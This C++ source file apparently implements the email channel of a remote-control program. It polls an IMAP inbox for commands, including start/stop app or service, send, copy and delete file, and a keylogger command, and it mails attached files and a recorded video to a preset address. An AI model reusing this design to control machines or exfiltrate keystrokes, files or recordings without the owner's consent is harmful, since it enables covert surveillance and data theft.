#include "mail.h"
#include "commands.h"
#include ".env.h"

// connect to the imap server
imaps* createIMAPConnection() {
    try {
		imaps* conn = new imaps(IMAP_SERVER, IMAP_PORT);
        conn->authenticate(SERVICE_MAIL_ADDRESS, SERVICE_MAIL_PASSWORD, imaps::auth_method_t::LOGIN);
        return conn;
    }
    catch (imap_error& exc) {
        cout << exc.what() << endl;
    }
    catch (dialog_error& exc) {
        cout << exc.what() << endl;
    }
    exit(EXIT_FAILURE);
}

// get the latest unread message
bool getNewMail(imaps& conn, message& msg) {
    try {
		// select the inbox folder
        conn.select("Inbox");

		// get the list of unread messages
        list<unsigned long> messages;
        list<imaps::search_condition_t> conds;
        conds.push_back(imaps::search_condition_t(imaps::search_condition_t::UNSEEN));
        conn.search(conds, messages, true);

        // fetch the latest unread message
        for (auto msg_uid : messages) {
            if (msg_uid <= 0) continue;

            conn.fetch("inbox", msg_uid, msg);

            return true;
        };
    }
    catch (imap_error& exc) {
        cout << exc.what() << endl;
    }
    catch (dialog_error& exc) {
        cout << exc.what() << endl;
    }

    return false;
}

string toLowerCase(string str) {
	transform(str.begin(), str.end(), str.begin(), ::tolower);
	return str;
}

// get the message text body
string getMessageTextBody(message& msg) {
	string body;

    if (msg.content_type().type == mailio::mime::media_type_t::MULTIPART) {
        for (const auto& part : msg.parts()) {
            if (part.content_type().type == mailio::mime::media_type_t::TEXT) {
				body = part.content();
                break;
            }
        }
    }
    else {
		body = msg.content();
    }

	return body;
}

bool receivedNewCommand(imaps& conn, string& title, string& nameObject, string& source, string& destination) {
    // mail message to store the fetched one
    message msg;

    // set the line policy to mandatory, so longer lines could be parsed
    msg.line_policy(codec::line_len_policy_t::MANDATORY);

	// if there is no new mail, return false
    if (!getNewMail(conn, msg)) return false;

	// get the message subject
	title = msg.subject();
    string body = getMessageTextBody(msg);

    if (
        title == START_APP || 
        title == STOP_APP || 
        title == START_SERVICE ||
        title == STOP_SERVICE ||
        title == SEND_FILE ||
        title == DELETE_FILE ||
        title == KEYLOGGER
    ) {
		nameObject = body;
    }
    else if (title == COPY_FILE) {
        stringstream ss(body);
		getline(ss, source, '\n'); // get the first line (source)
		getline(ss, destination, '\n'); // get the second line (destination)
        source = source.substr(0, source.size() - 1);
    }
    return true;
}

// connect to the smtp server
smtps* createSMTPConnection() {
	try {
		smtps* conn = new smtps(SMTP_SERVER, SMTP_PORT);
        conn->authenticate(SERVICE_MAIL_ADDRESS, SERVICE_MAIL_PASSWORD, smtps::auth_method_t::START_TLS);
        return conn;
	}
	catch (smtp_error& exc) {
		cout << exc.what() << endl;
	}
	catch (dialog_error& exc) {
		cout << exc.what() << endl;
	}
	exit(EXIT_FAILURE);
}

void createMessage(message& msg, string subject, string body) {
    msg.from(mail_address(SERVICE_MAIL_NAME, SERVICE_MAIL_ADDRESS));
    msg.add_recipient(mail_address(USER_MAIL_NAME, USER_MAIL_ADDRESS));
    msg.subject(subject);
    msg.content(body);
}

string extractFileName(string filePath) {
	size_t found = filePath.find_last_of("/\\");
	return filePath.substr(found + 1);
}

void attachFile(message& msg, string fileName) {
    ifstream ifs("receivedData.bin", ios::binary);
    list<tuple<std::istream&, string_t, message::content_type_t>> atts;
    atts.push_back(make_tuple(ref(ifs), fileName, message::content_type_t(message::media_type_t::APPLICATION, "octet-stream")));
    msg.attach(atts);
}

void attachVideo(message& msg, string fileName) {
    ifstream ifs("record.mp4", ios::binary);
    list<tuple<std::istream&, string_t, message::content_type_t>> atts;
    atts.push_back(make_tuple(ref(ifs), fileName, message::content_type_t(message::media_type_t::APPLICATION, "octet-stream")));
    msg.attach(atts);
}

void sendMail(smtps& conn, message& msg) {
	try {
		conn.submit(msg);
	}
	catch (smtp_error& exc) {
		cout << exc.what() << endl;
	}
	catch (dialog_error& exc) {
		cout << exc.what() << endl;
	}
}